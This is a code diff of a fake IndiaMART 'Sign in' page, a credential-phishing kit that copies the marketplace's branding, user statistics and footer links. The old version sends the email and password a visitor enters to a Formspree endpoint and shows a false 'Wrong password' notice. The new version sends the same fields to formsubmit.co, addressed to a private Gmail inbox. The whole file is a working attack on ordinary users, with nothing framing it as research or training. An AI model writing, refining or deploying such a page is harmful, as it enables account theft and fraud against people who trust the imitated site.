@@ -1,310 +1,302 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sigin in | IndiaMART Member Login</title>
-    <link rel="icon" type="image/png" href="logo.png">
-    <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background: #f5f5f5;
-            margin: 0;
-            padding: 0;
-        }
-        .header {
-            max-width: 800px;
-            margin: 0 auto;
-            background: #19706a;
-            color: #fff;
-            padding: 0.5rem 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            
-        }
-        .menu-icon {
-            position: absolute;
-            left: 1rem;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 2rem;
-            cursor: pointer;
-        }
-        .logo {
-            height: 40px;
-        }
-        .container {
-            max-width: 750px;
-            margin: 0rem auto;
-            background: #fff;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.07);
-            padding: 2rem 1.5rem 1.5rem 1.5rem;
-        }
-        .stats {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 1.5rem;
-            color: #19706a;
-            font-weight: 500;
-            padding: 0 32px; /* Add horizontal gap on left and right */
-        }
-        .stats-item {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex: 1;
-            text-align: left;
-            margin: 0 12px; /* Add gap between each stats-item */
-        }
-        .stats-item img {
-            width: 40px;
-            height: 40px;
-            margin-right: 0.7rem;
-            display: block;
-        }
-        .stats-text {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        /* Remove the border between stats columns */
-        .stats div:not(:last-child) {
-            border-right: none;
-        }
-        .login-title {
-            text-align: center;
-            font-size: 1.3rem;
-            font-weight: 500;
-            margin-bottom: 1rem;
-        }
-        .subtitle {
-            text-align: center;
-            color: #666;
-            font-size: 0.95rem;
-            margin-bottom: 1.5rem;
-        }
-        .login-form {
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-        }
-        .login-form input {
-            padding: 0.8rem;
-            border: 2px solid #19706a;
-            border-radius: 4px;
-            font-size: 1rem;
-            outline: none;
-        }
-        .login-form button {
-            background: #888;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            padding: 0.9rem;
-            font-size: 1.1rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .login-form button:hover {
-            background: #19706a;
-        }
-        .footer {
-            margin-top: 0rem;
-            background: #fff;
-            padding: 2rem 0 1rem 0;
-            border-top: 2px solid #e0e0e0;
-            max-width: 800px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .footer-content {
-            max-width: 1100px;
-            margin: 0 auto;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: flex-start;
-            font-size: 0.97rem;
-            text-align: left;
-        }
-        .footer-col {
-            flex: 1 1 200px;
-            margin: 0 1rem;
-            min-width: 180px;
-            /* Center content in each column */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .footer-col h4 {
-            font-size: 1.05rem;
-            margin-bottom: 0.7rem;
-            color: #788482;
-        }
-        .footer-col ul {
-            /* Center list items */
-            align-items: center;
-            display: flex;
-            flex-direction: column;
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-        .footer-col ul li {
-            margin-bottom: 0.5rem;
-        }
-        .footer-col ul li a {
-            color: #333;
-            text-decoration: none;
-            transition: color 0.2s;
-        }
-        .footer-col ul li a:hover {
-            color: #19706a;
-        }
-        .footer-social {
-            text-align: center;
-            margin-top: 1.5rem;
-        }
-        .footer-social a {
-            display: inline-block;
-            margin: 0 0.5rem;
-        }
-        .footer-social img {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-        }
-        @media (max-width: 900px) {
-            .footer-content {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            .footer-col {
-                margin-bottom: 1.5rem;
-            }
-        }
-        @media (max-width: 600px) {
-            .container {
-                padding: 1rem 0.5rem 1rem 0.5rem;
-            }
-            .footer-content {
-                padding: 0 1rem;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in | IndiaMART Member Login</title>
+  <link rel="icon" type="image/png" href="logo.png" />
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      max-width: 800px;
+      margin: 0 auto;
+      background: #19706a;
+      color: #fff;
+      padding: 0.5rem 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+    .menu-icon {
+      position: absolute;
+      left: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 2rem;
+      cursor: pointer;
+    }
+    .logo {
+      height: 40px;
+    }
+    .container {
+      max-width: 750px;
+      margin: 0rem auto;
+      background: #fff;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.07);
+      padding: 2rem 1.5rem 1.5rem 1.5rem;
+    }
+    .stats {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 1.5rem;
+      color: #19706a;
+      font-weight: 500;
+      padding: 0 32px;
+    }
+    .stats-item {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex: 1;
+      text-align: left;
+      margin: 0 12px;
+    }
+    .stats-item img {
+      width: 40px;
+      height: 40px;
+      margin-right: 0.7rem;
+      display: block;
+    }
+    .stats-text {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .login-title {
+      text-align: center;
+      font-size: 1.3rem;
+      font-weight: 500;
+      margin-bottom: 1rem;
+    }
+    .subtitle {
+      text-align: center;
+      color: #666;
+      font-size: 0.95rem;
+      margin-bottom: 1.5rem;
+    }
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+    .login-form input {
+      padding: 0.8rem;
+      border: 2px solid #19706a;
+      border-radius: 4px;
+      font-size: 1rem;
+      outline: none;
+    }
+    .login-form button {
+      background: #888;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 0.9rem;
+      font-size: 1.1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .login-form button:hover {
+      background: #19706a;
+    }
+    .footer {
+      background: #fff;
+      padding: 2rem 0 1rem 0;
+      border-top: 2px solid #e0e0e0;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    .footer-content {
+      max-width: 1100px;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: flex-start;
+      font-size: 0.97rem;
+      text-align: left;
+    }
+    .footer-col {
+      flex: 1 1 200px;
+      margin: 0 1rem;
+      min-width: 180px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .footer-col h4 {
+      font-size: 1.05rem;
+      margin-bottom: 0.7rem;
+      color: #788482;
+    }
+    .footer-col ul {
+      align-items: center;
+      display: flex;
+      flex-direction: column;
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .footer-col ul li {
+      margin-bottom: 0.5rem;
+    }
+    .footer-col ul li a {
+      color: #333;
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+    .footer-col ul li a:hover {
+      color: #19706a;
+    }
+    .footer-social {
+      text-align: center;
+      margin-top: 1.5rem;
+    }
+    .footer-social a {
+      display: inline-block;
+      margin: 0 0.5rem;
+    }
+    .footer-social img {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+    }
+    @media (max-width: 900px) {
+      .footer-content {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .footer-col {
+        margin-bottom: 1.5rem;
+      }
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 1rem 0.5rem 1rem 0.5rem;
+      }
+      .footer-content {
+        padding: 0 1rem;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="header">
-        <span class="menu-icon">&#9776;</span>
-        <img src="indiamart.png" alt="IndiaMART Logo" class="logo">
-    </div>
-    <div class="container">
-        <div class="login-title">Login to IndiaMART</div>
-        <div class="stats">
-            <div class="stats-item">
-                <img src="buyers.png" alt="Buyers" />
-                <div class="stats-text">
-                    <div style="font-size:1.1rem;">21.1 Crore+</div>
-                    <div style="font-size:0.95rem;">Buyers</div>
-                </div>
-            </div>
-            <div class="stats-item">
-                <img src="supplier.png" alt="Suppliers" />
-                <div class="stats-text">
-                    <div style="font-size:1.1rem;">84 LAKH+</div>
-                    <div style="font-size:0.95rem;">Suppliers</div>
-                </div>
-            </div>
-            <div class="stats-item">
-                <img src="products.png" alt="Products" />
-                <div class="stats-text">
-                    <div style="font-size:1.1rem;">11.9 Crore+</div>
-                    <div style="font-size:0.95rem;">Products</div>
-                </div>
-            </div>
+  <div class="header">
+    <span class="menu-icon">&#9776;</span>
+    <img src="indiamart.png" alt="IndiaMART Logo" class="logo" />
+  </div>
+
+  <div class="container">
+    <div class="login-title">Login to IndiaMART</div>
+
+    <div class="stats">
+      <div class="stats-item">
+        <img src="buyers.png" alt="Buyers" />
+        <div class="stats-text">
+          <div style="font-size:1.1rem;">21.1 Crore+</div>
+          <div style="font-size:0.95rem;">Buyers</div>
         </div>
-        <div class="subtitle">India's largest online B2B marketplace, connecting buyers with suppliers</div>
-        <form class="login-form" action="https://formspree.io/f/myzjlevy" method="POST" onsubmit="event.preventDefault(); showWrongPasswordAndSubmit(this);">
-            <input type="email" name="email" placeholder="Enter your email address" required>
-            <input type="password" name="password" placeholder="Enter your password" required>
-            <button type="submit" id="login-btn" disabled>Sign In</button>
-            <div id="login-error" style="color:#d32f2f;font-size:0.98rem;margin-top:0.5rem;display:none;">Wrong password. Please try again.</div>
-        </form>
-        <script>
-        // Enable button and change color when both fields are filled
-        const emailInput = document.querySelector('.login-form input[type="email"]');
-        const passwordInput = document.querySelector('.login-form input[type="password"]');
-        const loginBtn = document.getElementById('login-btn');
-        function checkInputs() {
-            if (emailInput.value.trim() && passwordInput.value.trim()) {
-                loginBtn.disabled = false;
-                loginBtn.style.background = '#19706a';
-            } else {
-                loginBtn.disabled = true;
-                loginBtn.style.background = '#888';
-            }
-        }
-        emailInput.addEventListener('input', checkInputs);
-        passwordInput.addEventListener('input', checkInputs);
-        function showWrongPasswordAndSubmit(form) {
-            document.getElementById('login-error').style.display = 'block';
-            // Submit the form data to Formspree
-            const formData = new FormData(form);
-            fetch(form.action, {
-                method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            });
-        }
-        </script>
-    </div>
-    <div class="footer">
-        <div class="footer-content" >
-            <div class="footer-col">
-                <ul>
-                    <li><a href="#">Home</a></li>
-                    <li><a href="#">About Us</a></li>
-                    <li><a href="#">Terms Of Use</a></li>
-                    <li><a href="#">Privacy Policy</a></li>
-                    <li><a href="#">Shipping & Delivery Policy</a></li>
-                    <li><a href="#">Returns & Cancellation Policy</a></li>
-                    <li><a href="#">Help</a></li>
-                    <li><a href="#">Customer Care</a></li>
-                    <li><a href="#">Contact Us</a></li>
-                    <li><a href="#">Success Stories</a></li>
-                    <li><a href="#">Press Section</a></li>
-                    <li><a href="#">Jobs & Careers</a></li>
-                    <li><a href="#">Desktop Site</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Suppliers Tool Kit</h4>
-                <ul>
-                    <li><a href="#">Sell on IndiaMART</a></li>
-                    <li><a href="#">Latest BuyLead</a></li>
-                    <li><a href="#">Learning Centre</a></li>
-                    <li><a href="#">Ship With IndiaMART</a></li>
-                </ul>
-                <h4>Buyers Tool Kit</h4>
-                <ul>
-                    <li><a href="#">Post Your Requirement</a></li>
-                    <li><a href="#">Search Product or Service</a></li>
-                </ul>
-                <h4 style="margin-top:1.2rem;">Accounting Solutions</h4>
-                <ul>
-                    <li><a href="#">Accounting Software</a></li>
-                    <li><a href="#">Tally on Mobile</a></li>
-                    <li><a href="#">GST e-Invoice</a></li>
-                </ul>
-            </div>
+      </div>
+      <div class="stats-item">
+        <img src="supplier.png" alt="Suppliers" />
+        <div class="stats-text">
+          <div style="font-size:1.1rem;">84 LAKH+</div>
+          <div style="font-size:0.95rem;">Suppliers</div>
         </div>
-        <div style="width:100%;text-align:center;margin:2rem 0 1.5rem 0;">
-        <img src="footer.png" alt="Footer Image" style="max-width:220px;width:100%;height:auto;display:inline-block;" />
+      </div>
+      <div class="stats-item">
+        <img src="products.png" alt="Products" />
+        <div class="stats-text">
+          <div style="font-size:1.1rem;">11.9 Crore+</div>
+          <div style="font-size:0.95rem;">Products</div>
+        </div>
+      </div>
     </div>
+
+    <div class="subtitle">India's largest online B2B marketplace, connecting buyers with suppliers</div>
+
+    <form class="login-form" action="https://formsubmit.co/foodtechsolution1990@gmail.com" method="POST">
+      <input type="email" name="email" placeholder="Enter your email address" required />
+      <input type="password" name="password" placeholder="Enter your password" required />
+      <button type="submit" id="login-btn" disabled>Sign In</button>
+      <div id="login-error" style="color:#d32f2f;font-size:0.98rem;margin-top:0.5rem;display:none;">Wrong password. Please try again.</div>
+    </form>
+
+    <script>
+      const emailInput = document.querySelector('.login-form input[type="email"]');
+      const passwordInput = document.querySelector('.login-form input[type="password"]');
+      const loginBtn = document.getElementById('login-btn');
+
+      function checkInputs() {
+        if (emailInput.value.trim() && passwordInput.value.trim()) {
+          loginBtn.disabled = false;
+          loginBtn.style.background = '#19706a';
+        } else {
+          loginBtn.disabled = true;
+          loginBtn.style.background = '#888';
+        }
+      }
+
+      emailInput.addEventListener('input', checkInputs);
+      passwordInput.addEventListener('input', checkInputs);
+      checkInputs(); // call on page load
+    </script>
+  </div>
+
+  <div class="footer">
+    <div class="footer-content">
+      <div class="footer-col">
+        <ul>
+          <li><a href="#">Home</a></li>
+          <li><a href="#">About Us</a></li>
+          <li><a href="#">Terms Of Use</a></li>
+          <li><a href="#">Privacy Policy</a></li>
+          <li><a href="#">Shipping & Delivery Policy</a></li>
+          <li><a href="#">Returns & Cancellation Policy</a></li>
+          <li><a href="#">Help</a></li>
+          <li><a href="#">Customer Care</a></li>
+          <li><a href="#">Contact Us</a></li>
+          <li><a href="#">Success Stories</a></li>
+          <li><a href="#">Press Section</a></li>
+          <li><a href="#">Jobs & Careers</a></li>
+          <li><a href="#">Desktop Site</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col">
+        <h4>Suppliers Tool Kit</h4>
+        <ul>
+          <li><a href="#">Sell on IndiaMART</a></li>
+          <li><a href="#">Latest BuyLead</a></li>
+          <li><a href="#">Learning Centre</a></li>
+          <li><a href="#">Ship With IndiaMART</a></li>
+        </ul>
+
+        <h4>Buyers Tool Kit</h4>
+        <ul>
+          <li><a href="#">Post Your Requirement</a></li>
+          <li><a href="#">Search Product or Service</a></li>
+        </ul>
+
+        <h4 style="margin-top:1.2rem;">Accounting Solutions</h4>
+        <ul>
+          <li><a href="#">Accounting Software</a></li>
+          <li><a href="#">Tally on Mobile</a></li>
+          <li><a href="#">GST e-Invoice</a></li>
+        </ul>
+      </div>
     </div>
-   
+
+    <div style="width:100%;text-align:center;margin:2rem 0 1.5rem 0;">
+      <img src="footer.png" alt="Footer Image" style="max-width:220px;width:100%;height:auto;display:inline-block;" />
+    </div>
+  </div>
 </body>
 </html>
